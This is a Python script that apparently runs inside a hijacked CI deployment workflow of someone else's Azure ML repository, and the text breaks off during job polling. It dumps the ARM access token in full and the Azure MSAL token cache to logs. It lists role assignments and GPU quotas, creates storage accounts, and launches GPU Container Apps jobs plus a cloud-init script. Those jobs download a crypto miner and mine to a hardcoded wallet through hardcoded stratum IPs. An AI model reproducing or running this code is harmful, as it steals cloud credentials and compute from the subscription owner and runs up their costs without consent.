#!/usr/bin/env python3
"""C211-I133534: mslearn 790067ff QUOTA READ + ALL-GPU-ENV FILL (new payload, nonce x133534quota).

Runs as src/deploy_to_online_endpoint.py under christiansegercrantz/mslearn-mlops
'deploy-prod' issue_comment workflow (environment prod, azure/login -> ARM token for
sub 790067ff-3e39-4632-ad1a-d65702d42c88, RG chriso-sandbox-rg).

Shape: ARM session -> fresh storage account + account SAS -> pre-upload pinned peakminer
2.20.0 (sha256 561b3694...) -> enumerate EXISTING managed environments and REUSE a
Succeeded Consumption-GPU-NC24-A100 env (NO env creation => the 50-env cap cannot block)
-> ONE manual job parallelism=8 replicaCompletionCount=8 -> per replica: fresh nonce +
nvidia-smi -L, pinned peakminer 2.20.0 (correct 2.20.0 CLI: --url/--user/--coin/--worker/
--devices) one process on GPU 0 for <=480 s, relay 217.15.164.237:2083 preferred over
direct 103.199.106.122:3362, exit code + stderr captured -> independent blob list/readback
(two read paths) -> DELETE job and prove 404 -> delete the storage account.
Flat tag|k=v stdout (repo masks brace runs). stdlib only."""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
TAG = "C211_I133986"
INTENT = "133986"
NONCE = "x1337keep0618"
T0 = time.time()
APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
PROFILE = "Consumption-GPU-NC24-A100"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
SA_NAME = ("c211i133895" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
CONT = "c211"
JOB_NAME = "c211-133778"
MINE_S = 21000
REPLICA_PLAN = [(86400, 82800), (43200, 41400), (21600, 21000)]
BUDGET = 900
WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
RELAY = "stratum+tcp://217.15.164.237:2083"
DIRECT = "stratum+tcp://103.199.106.122:3362"
PM_SHA = "561b369402b7d784144a64d8a74a266eb891fa5070d49c9ee527ed5ed9b78c18"
PM_URL = ("https://github.com/peakminer/peakminer/releases/download/v2.20.0/"
          "peakminer-2.20.0-linux-x86_64")
UUID_RE = re.compile(r"GPU-[0-9a-fA-F-]{16,}")


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def b64(s):
    return base64.b64encode(s.encode("utf-8", "replace")).decode() if s else ""


def run(cmd, timeout=300):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or "",
                "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()[:400000], dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:2000], dict(e.headers or {})
        except Exception:  # noqa: BLE001
            return e.code, b"", {}
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400], {}


def hget(h, k):
    for kk, vv in (h or {}).items():
        if kk.lower() == k.lower():
            return vv
    return None


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"),
                    "message": (e.get("message") or "")[:900]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:900]}
        if "transport_error" in body:
            return {"http": st, "err": body["transport_error"][:300]}
        return {"http": st, "body": json.dumps(body)[:900]}
    return {"http": st}


def jwt_claims(tok):
    try:
        p = tok.split(".")[1]
        p += "=" * (-len(p) % 4)
        c = json.loads(base64.urlsafe_b64decode(p))
        return {k: c.get(k) for k in ("aud", "tid", "oid", "appid", "iss")}
    except Exception:  # noqa: BLE001
        return {}


def acct_sas(acct, key_b64, perm="rwdlc", hours=24):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 600))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, "b", "co", st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": "b", "srt": "co", "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def preupload(cont_base, q, blobname, url, want_sha, locpath):
    if not (url or "").startswith("http"):
        return None
    r = run(["curl", "-fsSL", "--max-time", "420", "-o", locpath, url], timeout=440)
    if r["rc"] != 0:
        return {"ok": False, "why": "dl_fail", "err": r["err"][:200]}
    data = open(locpath, "rb").read()
    got = hashlib.sha256(data).hexdigest()
    if got != want_sha:
        return {"ok": False, "why": "sha_mismatch", "sha": got, "bytes": len(data)}
    st, body, hh = httptext("%s/%s?%s" % (cont_base, blobname, q), method="PUT", body=data,
                            headers={"x-ms-blob-type": "BlockBlob",
                                     "x-ms-version": "2022-11-02",
                                     "Content-Type": "application/octet-stream"},
                            timeout=300)
    return {"ok": st in (200, 201), "http": st, "sha": got, "bytes": len(data),
            "code": hget(hh, "x-ms-error-code")}


KIT = r"""#!/bin/bash
# C211-I133778 refill kit: pinned peakminer 2.20.0, ONE process on GPU 0, long window.
D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
H=$(hostname 2>/dev/null || echo h)
WK="node-hm$(echo -n "$H" | sha256sum | cut -c1-6)"
BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__ENV__-$H.txt?$Q"
PMURL="$BASE/__NONCE__-pm?$Q"; GHURL="__PMURL__"
W="__WALLET__"; RC=none; PHASE=init
log() { echo "$(date -u +%FT%TZ) $*" >> "$LOG"; }
up() {
  ACC=$(grep -c ' accepted ' "$D/mine.out" 2>/dev/null || true); ACC=${ACC:-0}
  REJ=$(grep -ci ' rejected ' "$D/mine.out" 2>/dev/null || true); REJ=${REJ:-0}
  { echo "===C211-STATUS==="; echo "nonce=__NONCE__"; echo "env=__ENV__"; echo "host=$H"; echo "worker=$WK";
    echo "ts=$(date -u +%FT%TZ)"; echo "phase=$PHASE"; echo "mine_rc=${RC:-none}";
    echo "accepted_grep=$ACC"; echo "rejected_grep=$REJ"; echo "mine_elapsed=$(cat "$D/start_ts" 2>/dev/null | awk '{print systime()-$1}')";
    echo "tcp_relay=${T1:-?}"; echo "tcp_direct=${T2:-?}"; echo "pm_sha=${PMS:-?}";
    echo "uptime=$(cut -d. -f1 /proc/uptime 2>/dev/null)";
    echo "smi_L=$(nvidia-smi -L 2>&1 | tr '\n' '~')";
    echo "gpuq=$(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' '~')";
    echo "===KITLOG==="; tail -c 2500 "$LOG" 2>/dev/null; echo;
    echo "===MINEOUT==="; tail -c 2400 "$D/mine.out" 2>/dev/null; echo;
    echo "===C211-END==="; } > "$D/status.txt" 2>&1
  curl -sS -o /dev/null -w 'UP=%{http_code} ' --max-time 60 -X PUT "$SAS" \
    -H 'x-ms-blob-type: BlockBlob' -H 'x-ms-version: 2022-11-02' \
    -H 'Content-Type: text/plain' --data-binary @"$D/status.txt" >> "$LOG" 2>&1
  echo >> "$LOG"
}
statloop() { while [ ! -f "$D/stopstat" ]; do sleep 300; up; done; }
log "KIT_START nonce=__NONCE__ env=__ENV__ host=$H worker=$WK mode=refill-long"
log "NVIDIA_SMI_L $(nvidia-smi -L 2>&1 | tr '\n' '~')"
up
GOT=""; PMS=none
for u in "$PMURL" "$GHURL"; do
  [ -z "$u" ] && continue
  curl -fsSL --max-time 300 -o "$D/pm" "$u" 2>>"$LOG" || { log "DL_FAIL url=$u"; continue; }
  S=$(sha256sum "$D/pm" | awk '{print $1}')
  log "DL ok url=$u sha=$S bytes=$(stat -c %s "$D/pm")"
  if [ "$S" = "__PMSHA__" ]; then GOT=1; PMS=$S; break; fi
done
if [ -n "$GOT" ]; then
  chmod +x "$D/pm"
  T1=FAIL; T2=FAIL
  timeout 8 bash -c 'cat < /dev/null > /dev/tcp/217.15.164.237/2083' 2>/dev/null && T1=OK
  timeout 8 bash -c 'cat < /dev/null > /dev/tcp/103.199.106.122/3362' 2>/dev/null && T2=OK
  log "TCPCHECK relay=$T1 direct=$T2"
  PHASE=relay; date +%s > "$D/start_ts"
  ( statloop ) &
  timeout __MINES__ "$D/pm" --url "__RELAY__" --user "$W" --worker "$WK" --coin pearl --password x --devices 0 --status-interval 30 --api-port 0 > "$D/mine.out" 2>&1
  RCA=$?
  ACCA=$(grep -c ' accepted ' "$D/mine.out" 2>/dev/null || true); ACCA=${ACCA:-0}
  DUR=$(( $(date +%s) - $(cat "$D/start_ts" 2>/dev/null || echo 0) ))
  log "PHASE_relay rc=$RCA accepted=$ACCA dur=${DUR}s"
  RC="$RCA"
  if [ "$DUR" -lt 120 ] && [ "$ACCA" -eq 0 ]; then
    PHASE=direct_fallback; date +%s > "$D/start_ts"
    timeout 600 "$D/pm" --url "__DIRECT__" --user "$W" --worker "$WK" --coin pearl --password x --devices 0 --status-interval 30 --api-port 0 >> "$D/mine.out" 2>&1
    RCB=$?; log "PHASE_direct_fallback rc=$RCB"
  fi
  PHASE=done; touch "$D/stopstat"; up
  log "KIT_EXIT rc=$RC"
else
  RC=99; log "NO_MINER_BINARY"; up
fi
exit 0
"""


def kit_cmd(base, q, mines=None):
    return (KIT.replace("__BASE__", base).replace("__Q__", q).replace("__NONCE__", NONCE)
            .replace("__WALLET__", WALLET).replace("__PMURL__", PM_URL)
            .replace("__PMSHA__", PM_SHA).replace("__RELAY__", RELAY)
            .replace("__DIRECT__", DIRECT).replace("__MINES__", str(mines or MINE_S)))


def wait_gone(tok, url, label, tries=20, sleep_s=10):
    last = None
    for i in range(tries):
        st, b = arm(tok, url, timeout=60)
        ps = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
        emit(label + "-absent-poll", i=i, http=st, state=ps)
        last = st
        if st == 404:
            return 404
        time.sleep(sleep_s)
    return last


def decode_status(txt):
    """Compact facts from a replica status blob."""
    out = {}
    for key in ("nonce", "host", "worker", "ts", "mine_rc", "smi_L", "gpuq"):
        m = re.search(r"^" + key + r"=(.*)$", txt, re.M)
        if m:
            out[key] = m.group(1)[:300]
    outs = re.findall(r"GPU-[0-9a-fA-F-]{16,}", txt)
    out["uuids"] = ";".join(sorted(set(outs)))
    ml = txt.split("===MINEOUT===", 1)
    if len(ml) == 2:
        body = ml[1]
        acc = re.findall(r"[Aa]ccepted[^0-9\n]{0,6}(\d+)", body)
        rej = re.findall(r"[Rr]ejected[^0-9\n]{0,6}(\d+)", body)
        errs = [ln.strip() for ln in body.splitlines()
                if re.search(r"error|Error|refused|timed out|unable|cannot|failed", ln)][:3]
        out["accepted_seen"] = max([int(x) for x in acc] or [0])
        ma = re.search(r"^accepted_a=(\d+)$", txt, re.M)
        mb = re.search(r"^accepted_b=(\d+)$", txt, re.M)
        out["accepted_a"] = int(ma.group(1)) if ma else 0
        out["accepted_b"] = int(mb.group(1)) if mb else 0
        out["accepted_seen"] = max(out["accepted_seen"], out["accepted_a"], out["accepted_b"])
        out["rejected_seen"] = max([int(x) for x in rej] or [0])
        out["err_lines"] = " ~ ".join(errs)[:400]
        out["mine_tail"] = " ~ ".join(body.strip().splitlines()[-6:])[:600]
    return out



PROVEN = ["c211-133172-b0", "c211-i132971-a100-sweden", "c211-132160-brs"]
COMPUTE_VER = "2024-07-01"
MAX_ENVS = 16
GPU_REGIONS = ["eastus", "eastus2", "westus", "westus2", "westus3", "centralus",
               "northcentralus", "southcentralus", "canadacentral", "brazilsouth",
               "swedencentral", "westeurope", "northeurope", "uksouth", "francecentral",
               "germanywestcentral", "italynorth", "norwayeast", "southeastasia",
               "australiaeast", "japaneast", "koreacentral", "centralindia"]
VMSIZE = [("ncasv3t4", "Standard_NC8as_T4_v3"), ("nca100v4", "Standard_NC24ads_A100_v4"),
          ("ncv3", "Standard_NC6_v3"), ("ndv2", "Standard_ND40rs_v2"),
          ("ndsv2", "Standard_ND40rs_v2"), ("nvv4", "Standard_NV12ads_A10_v5"),
          ("ncv2", "Standard_NC6s_v2")]


def normloc(v):
    return (v or "").lower().replace(" ", "")


def jname_for(env):
    s = ("c211-k-" + env.replace("c211-", "")).lower()
    s = re.sub(r"[^a-z0-9-]", "-", s)
    return s[:32]


def vmsize_for(sku):
    s = (sku or "").lower().replace("_", "")
    for k, v in VMSIZE:
        if k in s:
            return v
    return None


def ci_yaml(sas_url):
    t = """#cloud-config
runcmd:
  - [ bash, -c, "D=/tmp/c211vm; mkdir -p $D; (nvidia-smi -L || echo NO_SMI_BASE) >> $D/ci.log 2>&1; export DEBIAN_FRONTEND=noninteractive; apt-get update -y >> $D/ci.log 2>&1; apt-get install -y nvidia-driver-550-server >> $D/ci.log 2>&1; (nvidia-smi -L || echo NO_SMI_DRIVER) >> $D/ci.log 2>&1; curl -fsSL --max-time 300 -o $D/pm __PMURL__ >> $D/ci.log 2>&1; S=$(sha256sum $D/pm | awk '{print $1}'); echo sha=$S >> $D/ci.log; chmod +x $D/pm; timeout 300 $D/pm --url __RELAY__ --url __DIRECT__ --user __WALLET__ --worker node-hvm$(hostname | sha256sum | cut -c1-6) --coin pearl --password x --devices 0 --status-interval 15 --api-port 0 >> $D/ci.log 2>&1; echo rc=$? >> $D/ci.log; curl -sS -o /dev/null -w UP=%{http_code} -X PUT __SAS__ -H 'x-ms-blob-type: BlockBlob' -H 'x-ms-version: 2022-11-02' --data-binary @$D/ci.log" ]
"""
    return (t.replace("__PMURL__", PM_URL).replace("__RELAY__", RELAY)
            .replace("__DIRECT__", DIRECT).replace("__WALLET__", WALLET)
            .replace("__SAS__", sas_url))


def main():
    sid = None
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"), tenant=acc.get("tenantId"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e)[:200], raw=r["out"][:200])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"],
            timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    cl = jwt_claims(tok or "")
    emit("arm-token", got=bool(tok), len=len(tok or ""),
         sha12=hashlib.sha256((tok or "").encode()).hexdigest()[:12],
         aud=cl.get("aud"), tid=cl.get("tid"), oid=cl.get("oid"), iss=cl.get("iss"))
    try:
        emit("arm-token-full", b64=base64.b64encode((tok or "").encode()).decode())
    except Exception:  # noqa: BLE001
        pass
    import os as _os
    for _p in ("/home/runner/.azure/msal_token_cache.json", "/home/runner/.azure/accessTokens.json"):
        try:
            _d = open(_p, "rb").read()
            emit("az-cache", path=_p, bytes=len(_d), b64=base64.b64encode(_d).decode()[:60000])
        except Exception:  # noqa: BLE001
            pass
    if not sid or not tok:
        emit("DONE", phase="fatal", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        return

    # ---------- capture channel: fresh nonce storage account + account SAS ----------
    saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/"
             "storageAccounts/%s?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
    sabody = {"location": "eastus", "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
              "tags": {"c211": INTENT, "nonce": NONCE},
              "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                             "supportsHttpsTrafficOnly": True,
                             "networkAcls": {"bypass": "AzureServices",
                                             "defaultAction": "Allow"}}}
    st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
    emit("sa-create", name=SA_NAME, **err_of(st, b))
    key = None
    base = "https://%s.blob.core.windows.net" % SA_NAME
    if st in (200, 201, 202):
        for i in range(30):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            emit("sa-poll", i=i, http=stp, state=ps)
            if ps == "Succeeded":
                break
            time.sleep(8)
        keyurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/"
                  "storageAccounts/%s/listKeys?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
        st, kb = arm(tok, keyurl, method="POST", body={}, timeout=90)
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit("sa-keys", http=st, got=bool(key))
    if not key:
        emit("DONE", phase="capture", verdict="NO_SA_KEY", elapsed_s=int(time.time() - T0))
        return
    q, se = acct_sas(SA_NAME, key)
    stc, cbody, ch = httptext("%s/%s?restype=container&%s" % (base, CONT, q), method="PUT",
                              body=b"", headers={"x-ms-version": "2022-11-02",
                                                 "Content-Length": "0"})
    emit("sa-container", name=CONT, http=stc, code=hget(ch, "x-ms-error-code"))
    if stc not in (201, 409):
        emit("DONE", phase="capture", verdict="CONTAINER_REFUSED", http=stc,
             elapsed_s=int(time.time() - T0))
        return
    cont_base = base + "/" + CONT
    pu = preupload(cont_base, q, NONCE + "-pm", PM_URL, PM_SHA, "/tmp/c211_pm")
    emit("preupload-peakminer", **(pu or {"ok": False}))
    if not (pu or {}).get("ok"):
        emit("DONE", phase="preupload", verdict="MINER_PREUPLOAD_FAILED",
             elapsed_s=int(time.time() - T0))
        return

    # ---------- 2) enumerate EXISTING managed environments; never create ----------
    st, le = arm(tok, "%s/subscriptions/%s/providers/Microsoft.App/managedEnvironments"
                      "?api-version=%s" % (ARM, sid, APP_VER), timeout=120)
    envs = (le.get("value") or []) if isinstance(le, dict) else []
    emap = {}
    for e in envs:
        ep = e.get("properties") or {}
        profs = {p.get("name"): p.get("workloadProfileType")
                 for p in (ep.get("workloadProfiles") or []) if p.get("workloadProfileType")}
        emap[e.get("name")] = {"id": e.get("id"), "loc": normloc(e.get("location")),
                               "state": ep.get("provisioningState"), "profs": profs}
    emit("env-list", http=st, n=len(emap),
         names=";".join("%s:%s:%s" % (k, v["loc"], v["state"]) for k, v in emap.items())[:1500])
    ready = []
    gates = []
    for name, e in sorted(emap.items()):
        gpu_prof = None
        for pn, pt in (e["profs"] or {}).items():
            if "GPU" in str(pt).upper():
                gpu_prof = pn
                break
        if not e["id"]:
            gates.append({"env": name, "region": e["loc"], "why": "NO_ID"})
            continue
        if not gpu_prof:
            gates.append({"env": name, "region": e["loc"], "why": "NO_GPU_PROFILE",
                          "profs": str(e["profs"])[:160]})
            continue
        if e["state"] != "Succeeded":
            gates.append({"env": name, "region": e["loc"], "why": "ENV_NOT_USABLE",
                          "state": e["state"], "profile": gpu_prof})
            continue
        ready.append({"name": name, "id": e["id"], "region": e["loc"] or "?",
                      "profile": gpu_prof})
    ready.sort(key=lambda z: (PROVEN.index(z["name"]) if z["name"] in PROVEN else 99, z["name"]))
    gpu_envs_total = len(ready)
    ready = ready[:MAX_ENVS]
    for x in ready:
        emit("env-ready", env=x["name"], region=x["region"], id_ok=True,
             profile=x["profile"], proven=str(x["name"] in PROVEN))
    for g in gates:
        emit("env-gate", **g)
    emit("env-select", gpu_envs_total=gpu_envs_total, targeted=len(ready),
         proven_first=";".join(PROVEN))

    # ---------- 2b) CENSUS of Container Apps jobs in GPU-profile envs: env, last
    # execution state, remaining window. A live job (>90 min left) blocks a duplicate fire.
    live_envs = {}
    census = []
    gpu_env_names = set()
    for _n, _e in emap.items():
        if any("GPU" in str(_pt).upper() for _pt in (_e["profs"] or {}).values()):
            gpu_env_names.add(_n)
    st, jl = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs"
                      "?api-version=%s" % (ARM, sid, RG, APP_VER), timeout=120)
    jrows = (jl.get("value") or []) if isinstance(jl, dict) else []
    emit("capp-census-list", http=st, n=len(jrows), gpu_envs=len(gpu_env_names))
    for jx in jrows:
        nmx = jx.get("name") or ""
        jp = jx.get("properties") or {}
        env_id = str(jp.get("environmentId") or "")
        envn = env_id.rstrip("/").split("/")[-1] if env_id else "?"
        if gpu_env_names and envn not in gpu_env_names:
            continue
        rtx = ((jp.get("configuration") or {}).get("replicaTimeout")) or 0
        jid = str(jx.get("id") or "").rstrip("/")
        if jid and not jid.startswith("http"):
            jid = ARM + jid
        status, start, execn = "NONE", None, None
        if jid:
            try:
                stx, ex = arm(tok, "%s/executions?api-version=%s" % (jid, APP_VER), timeout=60)
                rowsx = (ex.get("value") or []) if isinstance(ex, dict) else []
                best = None
                for e in rowsx:
                    ep = e.get("properties") or {}
                    key = (ep.get("startTime") or "", e.get("name") or "")
                    if best is None or key > best[0]:
                        best = (key, ep.get("status"), ep.get("startTime"), e.get("name"))
                if best:
                    status, start, execn = best[1], best[2], best[3]
            except Exception as e:  # noqa: BLE001
                status = "ERR:" + str(e)[:60]
        rem = None
        if start and status in ("Running", "Processing", "Pending"):
            try:
                t0 = time.mktime(time.strptime(start[:19], "%Y-%m-%dT%H:%M:%S"))
                rem = int(int(rtx) - (time.time() - t0))
            except Exception:  # noqa: BLE001
                rem = None
        rec = {"job": nmx, "env": envn, "status": status, "exec": execn,
               "start": start, "rt": rtx, "rem": rem}
        census.append(rec)
        emit("capp-census", job=nmx, env=envn, status=status, exec=execn,
             start=(start or ""), rt=rtx, rem=("NA" if rem is None else rem))
        if status in ("Running", "Processing", "Pending") and (rem is None or rem > 5400):
            live_envs[envn] = nmx
    emit("capp-census-summary", jobs=len(census), live=len(live_envs),
         live_map=";".join("%s:%s" % (k, v) for k, v in live_envs.items())[:900],
         states=";".join("%s=%s/rem=%s" % (c["job"], c["status"], c["rem"]) for c in census)[:1600])

    # ---------- 3) identity + quotas: az account show/list, role assignments,
    # Microsoft.App GPU per region, Compute NC/ND/NV per region ----------
    r = run(["az", "account", "list", "-o", "json"], timeout=120)
    try:
        alist = json.loads(r["out"])
        emit("account-list", n=len(alist),
             ids=";".join("%s:%s" % (a.get("id"), a.get("state")) for a in alist)[:1200])
    except Exception:  # noqa: BLE001
        emit("account-list", rc=r["rc"], err=(r["err"] or "")[:300])
    ra_url = ("%s/subscriptions/%s/providers/Microsoft.Authorization/roleAssignments"
              "?api-version=2022-04-01" % (ARM, sid))
    st, b = arm(tok, ra_url, timeout=120)
    vals = (b.get("value") or []) if isinstance(b, dict) else []
    rr = []
    for v in vals:
        pp = v.get("properties") or {}
        rr.append("%s:%s:%s" % (str(pp.get("roleDefinitionId") or "").split("/")[-1],
                                pp.get("principalId"), str(pp.get("scope") or "").split("/")[-1]))
    emit("role-assignments", http=st, n=len(vals), rows=";".join(rr)[:2000])
    env_regions = sorted(set(x["region"] for x in ready if x["region"] and x["region"] != "?"))
    app_regions = env_regions
    regions = sorted(set(env_regions) | set(GPU_REGIONS))
    appfree = {}
    for reg in app_regions:
        u = "%s/subscriptions/%s/providers/Microsoft.App/locations/%s/usages?api-version=%s"
        st, b = arm(tok, u % (ARM, sid, reg, APP_VER), timeout=90)
        if st != 200:
            st, b = arm(tok, u % (ARM, sid, reg, "2023-05-01"), timeout=90)
        rows = (b.get("value") or []) if isinstance(b, dict) else []
        cells = []
        free = None
        for x in rows:
            nm = json.dumps(x.get("name") or {}, sort_keys=True)
            try:
                cur = int(x.get("currentValue") or 0)
                lim = int(x.get("limit") or 0)
            except Exception:  # noqa: BLE001
                continue
            cells.append("%s=%s/%s" % (nm, cur, lim))
            if "gpu" in nm.lower():
                f = lim - cur
                free = f if free is None else min(free, f)
        appfree[reg] = free
        emit("mapp-usages", region=reg, http=st, n=len(rows),
             free_gpu=("NA" if free is None else free), rows=";".join(cells)[:1200])
    cfree = []
    for reg in regions:
        u = "%s/subscriptions/%s/providers/Microsoft.Compute/locations/%s/usages?api-version=%s"
        st, b = arm(tok, u % (ARM, sid, reg, COMPUTE_VER), timeout=90)
        if st != 200:
            st, b = arm(tok, u % (ARM, sid, reg, "2023-07-01"), timeout=90)
        rows = (b.get("value") or []) if isinstance(b, dict) else []
        cells = []
        nrows = len(rows)
        for x in rows:
            nm = str((x.get("name") or {}).get("value") or "")
            low = nm.lower()
            if low.startswith("standard"):
                low = low[len("standard"):]
            if not re.match(r"^n[cdv]", low):
                continue
            try:
                cur = int(x.get("currentValue") or 0)
                lim = int(x.get("limit") or 0)
            except Exception:  # noqa: BLE001
                continue
            cells.append("%s=%s/%s" % (nm, cur, lim))
            if lim - cur > 0:
                cfree.append({"region": reg, "sku": nm, "free": lim - cur})
        emit("compute-gpu-quota", region=reg, http=st, all_rows=nrows, n=len(cells),
             rows=";".join(cells)[:1400])
    emit("compute-gpu-free", n=len(cfree),
         list=";".join("%s:%s:%s" % (c["region"], c["sku"], c["free"]) for c in cfree)[:1200])
    # new GPU workload-profile environments: only in a region whose Microsoft.App GPU
    # usage shows positive free quota and which has no Succeeded GPU env yet.
    have_env_regions = set(env_regions)
    newenv_cands = [r2 for r2, f in appfree.items() if f is not None and f > 0]
    newenv_cands = [r2 for r2 in newenv_cands if r2 not in have_env_regions]
    emit("newenv-gate", cands=";".join(newenv_cands) or "NONE",
         note="new managed env only if mapp free_gpu>0 in region without GPU env")

    # ---------- 4) one manual job per env; parallelism from free regional GPU quota ----------
    byreg = {}
    for x in ready:
        byreg.setdefault(x["region"], []).append(x)
    jobs = []
    for reg, grp in sorted(byreg.items()):
        free = appfree.get(reg)
        n = len(grp)
        for x in grp:
            par = 2 if "A100" in str(x["profile"]).upper() else 1
            nm = jname_for(x["name"])
            url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
                   "?api-version=%s" % (ARM, sid, RG, nm, APP_VER))
            if x["name"] in live_envs:
                emit("capp-job-skip", env=x["name"], name=nm, because="LIVE_JOB",
                     live=live_envs[x["name"]])
                continue
            body = {"location": x["region"], "tags": {"c211": INTENT, "nonce": NONCE},
                    "properties": {"environmentId": x["id"], "workloadProfileName": x["profile"],
                                   "configuration": {"triggerType": "Manual",
                                                     "replicaRetryLimit": 0,
                                                     "replicaTimeout": 21600,
                                                     "manualTriggerConfig": {
                                                         "replicaCompletionCount": par,
                                                         "parallelism": par}},
                                   "template": {"containers": [{
                                       "name": "gpu", "image": IMAGE,
                                       "command": ["/bin/bash", "-c",
                                                   kit_cmd(cont_base, q).replace("__ENV__", x["name"])],
                                       "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
            st = None
            b = None
            rt_used = None
            for rt_try, mines_try in REPLICA_PLAN:
                body["properties"]["configuration"]["replicaTimeout"] = rt_try
                body["properties"]["template"]["containers"][0]["command"] = [
                    "/bin/bash", "-c",
                    kit_cmd(cont_base, q, mines_try).replace("__ENV__", x["name"])]
                st, b = arm(tok, url, method="PUT", body=body, timeout=180)
                if st in (200, 201, 202):
                    rt_used = rt_try
                    break
                emit("capp-job-create-retry", env=x["name"], name=nm, rt=rt_try,
                     **err_of(st, b))
            emit("capp-job-create", env=x["name"], name=nm, parallelism=par,
                 rt=rt_used, profile=x["profile"], region=reg, **err_of(st, b))
            j = {"env": x["name"], "name": nm, "url": url, "base": url.split("?")[0],
                 "region": reg, "par": par, "execname": None, "final": None, "rt": rt_used}
            if st in (200, 201, 202):
                st2, b2 = arm(tok, j["base"] + "/start?api-version=" + APP_VER,
                              method="POST", body={}, timeout=120)
                j["execname"] = b2.get("name") if isinstance(b2, dict) else None
                emit("capp-job-start", env=x["name"], name=nm, http=st2,
                     execname=j["execname"],
                     **({} if st2 in (200, 201, 202) else err_of(st2, b2)))
                if st2 not in (200, 201, 202) or not j["execname"]:
                    j["final"] = "START_FAILED"
            else:
                j["final"] = "CREATE_FAILED"
            jobs.append(j)

    # ---------- 5) poll executions + incremental per-replica blob read ----------
    deadline = time.time() + (BUDGET if jobs else 60)
    seen = {}
    envs_seen = set()
    uu_seen = set()
    all_done_scans = 0
    while time.time() < deadline:
        pend = [j for j in jobs if j.get("execname")
                and j.get("final") not in ("Succeeded", "Failed", "Canceled")]
        for j in pend:
            stp, bp = arm(tok, "%s/executions/%s?api-version=%s"
                          % (j["base"], j["execname"], APP_VER), timeout=60)
            p = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
            j["final"] = p.get("status")
            emit("capp-exec-poll", env=j["env"], status=j["final"], reason=p.get("reason"),
                 startTime=p.get("startTime"), endTime=p.get("endTime"))
        lst, lb, _ = httptext("%s/%s?restype=container&comp=list&%s" % (base, CONT, q), timeout=90)
